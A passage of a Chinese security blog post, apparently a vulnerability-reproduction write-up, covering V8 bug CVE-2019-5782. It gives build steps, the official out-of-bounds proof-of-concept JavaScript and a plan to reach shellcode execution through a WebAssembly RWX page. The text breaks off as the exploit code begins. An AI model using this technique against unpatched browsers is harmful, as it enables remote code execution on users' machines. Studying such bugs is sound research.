@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="v8 引擎漏洞 CVE-2019-5872 复现，因本人对 JIT 技术的了解较浅，故本文对漏洞成因的 JIT 方面并不做详细的说明。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2019-5782">
+<meta property="og:url" content="http://www.xi4oyu.top/696ac724/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="v8 引擎漏洞 CVE-2019-5872 复现，因本人对 JIT 技术的了解较浅，故本文对漏洞成因的 JIT 方面并不做详细的说明。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-2.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-3.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-4.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-5.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-7.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-8.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-9.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-10.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-11.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-12.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-13.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-14.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-15.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/696ac724/pasted-16.png">
+<meta property="article:published_time" content="2021-04-05T10:14:00.000Z">
+<meta property="article:modified_time" content="2021-04-05T10:14:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="v8">
+<meta property="article:tag" content="cve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.xi4oyu.top/images/696ac724/pasted-2.png">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/696ac724/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/696ac724/","path":"696ac724/","title":"CVE-2019-5782"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CVE-2019-5782 | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-number">3.1.</span> <span class="nav-text">泄露对象地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">3.2.</span> <span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-wasm-%E6%89%A7%E8%A1%8C-shellcode"><span class="nav-number">3.3.</span> <span class="nav-text">利用 wasm 执行 shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-exp"><span class="nav-number">4.</span> <span class="nav-text">完整 exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/696ac724/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2019-5782
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-04-05 18:14:00" itemprop="dateCreated datePublished" datetime="2021-04-05T18:14:00+08:00">2021-04-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>v8 引擎漏洞 CVE-2019-5872 复现，因本人对 JIT 技术的了解较浅，故本文对漏洞成因的 JIT 方面并不做详细的说明。</p>
+<span id="more"></span>
+
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>切换到漏洞修复前的版本，进行编译：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">git</span> checkout b474b3102bd4a95eafcdb68e0e44656046132bc9
+$ gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>debug 模式调试会有点问题，所以选择 release 模式进行编译</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ./tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>为了使用 job 等调试命令，在 <code>out.gn/x64.release/args.gn</code> 里写入下面配置：</p>
+<pre class="line-numbers language-none"><code class="language-none">is_debug &#x3D; false
+target_cpu &#x3D; &quot;x64&quot;
+v8_enable_backtrace &#x3D; true
+v8_enable_disassembler &#x3D; true
+v8_enable_object_print &#x3D; true
+v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后编译即可</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ninja -C out.gn/x64.release d8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先使用官方的 Poc 进行测试：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// Copyright 2018 the V8 project authors. All rights reserved.</span>
+<span class="token comment">// Use of this source code is governed by a BSD-style license that can be</span>
+<span class="token comment">// found in the LICENSE file.</span>
+<span class="token comment">// Flags: --allow-natives-syntax</span>
+<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
+<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>fun<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+res <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面的 <code>assertEquals</code> 是没有定义的，稍作更改如下：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
+<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>fun<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+res <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>可以看到，a2 数组的长度从 16 变成了 42(0x2a)，且从 <code>a2[16]</code> 往后的数值都不是 undefined，很明显出现了数组越界<br><img src="/images/696ac724/pasted-2.png" alt="upload successful"></p>
+<p>稍加调试，就可以发现问题出现在这里：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这里造成了越界写操作，把 a2 的 length 给改写了，但实际上对数组越界写的情况是会导致数组扩容的，经过了解，这是因为 JIT 优化把越界的一些检查去掉了，导致漏洞的产生</p>
+<p>可以看看漏洞修复的 diff ：<br><img src="/images/696ac724/pasted-3.png" alt="upload successful"></p>
+<p>修复前，函数参数的长度类型是 <code>Type::Range(0.0, Code::kMaxArguments, zone());</code></p>
+<p><code>Code::kMaxArguments</code> 的值是 65534，表示函数支持的最大参数数量是 65534，但是后来函数参数支持更多了，这里确没有更改，Poc 中使用了右移 16 位的操作符，65534 右移 16 位必定是 0，所以 JIT 认为这一计算始终是 0，于是进行了优化，把一些越界检查给去掉了，因此造成了越界读写的漏洞</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>只要改写 a2 的 length 字段很大的值，那么 a2 数组可以越界的范围很大，漏洞利用起来也很简单</p>
+<ol>
+<li>先利用数组越界读写泄露对象的地址</li>
+<li>再利用越界读写构造任意地址读写</li>
+<li>结合 1, 2 可以 leak 出 wasm 的 RWX 段位置，再任意写注入 shellcode </li>
+</ol>
+<p>先仿照 Poc 将 a2 的 length 改成很大的值，如 0xffff：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
